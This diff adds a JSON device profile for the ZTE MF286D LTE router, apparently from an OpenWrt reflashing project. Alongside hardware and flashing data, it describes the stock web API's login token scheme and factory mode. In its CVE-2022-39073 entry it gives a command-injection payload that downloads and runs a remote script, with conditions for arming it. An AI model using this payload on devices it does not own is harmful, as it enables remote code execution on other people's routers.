@@ -1,0 +1,105 @@
+{
+  "id": "zte-mf286d",
+  "lan_subnet": "192.168.0.0/24",
+  "vendor": "ZTE",
+  "description": "LTE Cat-12 indoor router (IPQ4019 + mPCIe MDM9250-class modem), Nordic/Telia carrier variants common on the second-hand market. Stock firmware is a ZTE-customized OpenWrt Chaos-Calmer-era fork with the goahead-based ZTE-Webs web UI.",
+  "openwrt": {
+    "target": "ipq40xx/generic",
+    "device": "zte_mf286d",
+    "profile": "zte_mf286d",
+    "default_ip": "192.168.1.1",
+    "version": "25.12.6",
+    "note": "Officially supported since 25.12.x. Arch arm_cortex-a7-neon-vfpv4. Sibling MF286C is ath79/mips — do not mix artifacts."
+  },
+  "hardware": {
+    "soc": "Qualcomm Atheros IPQ4019 (4x ARM Cortex-A7)",
+    "flash": "128 MB NAND (mtd8 web-cramfs + mtd9 UBI kernel+rootfs) + NOR (bootloader chain, 0:config/ART)",
+    "ram": "256 MB",
+    "ethernet_ports": "1x shared WAN/LAN1 + 3x LAN, all GbE",
+    "wifi": "integrated 2.4+5 GHz 802.11ac (IPQ40xx radio)",
+    "modem": {
+      "model": "ZTE cat.12 mPCIe module (MDM9250-class), ZTE Qualcomm-family firmware",
+      "usb_vendor_id": null,
+      "usb_product_id": null,
+      "capability": ["qmi", "mbim", "at"],
+      "usb_interfaces": "/dev/ttyUSB* under OpenWrt; AT historically ttyUSB1 in this family — re-detect per session",
+      "at_port": null,
+      "qmi_device": "/dev/cdc-wdm0 (expected; verify on first boot)",
+      "note": "Modem firmware steps B02->B12 via adb push + AT+FOTACTR deltas (makebit resources). AT+CSIM behavior unprobed (see modem-as-reader playbook appendix C)."
+    },
+    "serial": {
+      "uart": "X8 connector, 115200 8N1",
+      "note": "Requires case opening + soldering or clips — avoid; all known no-serial paths documented in recipes/zte/mf286d/notes.md"
+    },
+    "board_revision": "MF286DHW1.0",
+    "enclosure": "desktop",
+    "note": "LEDs largely driven by the modem, not the SoC (OpenWrt wiki)."
+  },
+  "mac_oui": "C8:EA:F8 (ZTE)",
+  "stock_default_ip": "192.168.0.1 (Nordic/Telia variant; global builds use 192.168.32.1)",
+  "stock_web": {
+    "server": "ZTE-Webs/2.5.0 (goahead-derived; handler binary usr/bin/goahead or zte_topsw_goahead depending on generation)",
+    "api": {
+      "get": "/goform/goform_get_cmd_process",
+      "set": "/goform/goform_set_cmd_process",
+      "factory": "/goform/goform_process",
+      "login_password_encoding": "SHA256hex-UPPERCASE(Base64(password)) — note: uppercase hex; MU5001-era lowercase variants do NOT match",
+      "session": "IP-bound + AD token per POST: AD = md5hex(md5hex(wa_inner_version + cr_version) + RD), RD fetched read-only via cmd=RD",
+      "lockout": "5 failed logins -> 300s lock; counter PERSISTS ACROSS REBOOTS (stored in cfg). Do not brute-force; compute the token offline.",
+      "notes": "Version reads (wa_inner_version, cr_version) answer unauthenticated. Authenticated browser-context is the most reliable write channel; bare curl sessions can return ambiguous results for some goformIds."
+    },
+    "factory_channel": {
+      "description": "The ZTE Sales Update Framework (SUF/ZAS) manufacturing protocol is reachable from the LAN via the stock web API with admin credentials",
+      "endpoints": {
+        "SwitchFactoryMode": "goformId=SwitchFactoryMode&SwitchCMD=Query|Open -> 'FactoryResult:Closed|Opened' (verified live on Nordic B10-gen)",
+        "ONLINE_UPGRADE_TOOL": "goformId=ONLINE_UPGRADE_TOOL&command=get_current_version -> full version manifest. ANSWERS UNAUTHENTICATED (info disclosure, CVE-report candidate)"
+      },
+      "download_mode": {
+        "entry": "Factory mode open + reboot path; also observed entered after watchdog reboots with factory flag set",
+        "behavior": "Device becomes DHCP client REQUESTING 192.168.32.1 and ARPs every ~1-5s for the tool host 192.0.0.1; SBL tftp-Gets armprg (armprgZTE.bin) from the tool's TFTP :69, then Sahara hello (8x1s retries) -> Firehose. One-shot per boot attempt.",
+        "tool": "ZTE_Sales_Update_Framework.exe (Windows, MFC; runs under wine 9.0 only to splash+crash — use WinPE/QEMU); UPDATE/ folder images are NOT signature-checked (community root_uImage swaps proven)"
+      }
+    }
+  },
+  "vulnerabilities_assessed": {
+    "cve-2022-39073": {
+      "title": "WATCH_DOG_SWITCH net_link_detect_url command injection (MF286R, CVSS 9.8)",
+      "status_on_this_device": "handler LIVE on Nordic B09/B10-gen; net_link_detect_url accepts and stores ';'-payloads byte-intact (verified readback); exec sink is system('watch_dog_ping.sh <url> <times>') in zte_net_link_detect",
+      "gate": "WAN status must be ppp_connected/ipv4_ipv6_connected/ipv6_connected (exact match — beware 'connected' substring matching 'ppp_disconnected'!); the binary refuses to run its check otherwise",
+      "payload_pattern": ";curl -o /tmp/s http://<host>:<port>/s;chmod +x /tmp/s;/tmp/s (curl AND tftp both present in this generation's rootfs)",
+      "watch_out": "the same feature REBOOTS the device after net_link_detect_ping_times failed pings — set ping_times high when arming, or the box reboot-cycles"
+    },
+    "cve-2023-25649": {
+      "title": "SET_DEVICE_LED night-mode command injection (MF286R, ZDI-23-818)",
+      "status_on_this_device": "endpoint live; time fields strictly digits+colon; night_mode_close_all_led accepts arbitrary strings but no observable exec on the runtime path (adb-shell cfg-set template exists in binary string table). Needs exact-generation disasm to chase further."
+    },
+    "nvram-websurlfilters-chain": {
+      "title": "Leo-PL websURLFilters -> zte_debug.sh tftp exec (eko.one.pl 19085)",
+      "status_on_this_device": "ABSENT: Nordic B09/B10 zte_debug.sh is a log-compression script with no tftp/exec feature; ipacm_switch.sh only tests the value for emptiness. Pre-existing injection entries found stored on a second-hand unit were inert."
+    }
+  },
+  "flash_methods": {
+    "zte-suf-root-uimage": {
+      "description": "ZTE Sales Update Framework flashing of a crafted root_uImage (mtd8+mtd9 concatenation, 38797312 bytes, erased 0xFF padding then UBI at 0x800000)",
+      "resources_required": ["SUF kit (makebit/mf286d-openwrt archive or equivalent UPDATE/ set)", "Windows PE environment (community uses Hiren's/Gandalf PE; QEMU+ISO or wine attempt)", "admin web password", "point-to-point or isolated VLAN to the device (download-mode DHCP + SBL listener)"],
+      "image_builder": "ilblogdicristiangallo/ZTE-MF286D-root_uImage-Builder (official sysupgrade.bin -> root_uImage)",
+      "provenance": "Stock images: dl.eko.one.pl/orig/zte_mf286d/NORDIC/{B02..B14}; ready-made OpenWrt root_uImage sha256 01f6f7bc310c26e5bbee5992aa79dbf4e5683a0f40226152ad307c92f02071d3 (2022-era, bootstrap then sysupgrade) or build fresh from official 25.12.6 sysupgrade sha256 20f41c151a0d255baa3d3ba0f0eea295567376b04e34d6ddeeb5a4cfe565c641",
+      "envelope": "LAN, device in download mode (or driven there via SwitchFactoryMode), ~5 min write window",
+      "partitions_touched": "mtd8+mtd9 only; bootloader/NOR/ART/modem EFS untouched (dump remaining partitions from OpenWrt post-flash for the unit-unique backup)",
+      "rollback": "same flow with stock root_uImageorig from the kit",
+      "known_good": true
+    },
+    "serial-tftp-initramfs": {
+      "description": "wiki route: serial console 115200 on X8, u-boot tftp of initramfs ITB, then sysupgrade -n",
+      "envelope": "serial (soldering) — last resort",
+      "known_good": true
+    }
+  },
+  "bench_observations": [
+    "Variant fingerprint: BD_TELIAMF286DV1.0.0B09 / CR_TELIAMF286DV1.0.0B10 / Nordic_MF286D_B10 (mix of B09 wa + B10 cr strings is normal)",
+    "USB ethernet adapters on the AI host: r8152 devices need power/control=on pinned (autosuspend disconnect-storms under load)",
+    "Laptop /tmp cleaners remove staged scripts/ISOs across multi-day sessions — re-stage from source repos or keep under /tmp/opencode subdirs with recent mtimes",
+    "Port 8080 on shared build hosts is frequently taken by other lanes' docker — verify payload-server ports before arming remote-exec URLs"
+  ],
+  "notes": "Species-level record for conwrt issue #621. Unit-level identifiers (MAC/IMEI/passwords) belong in the operator's private project only."
+}
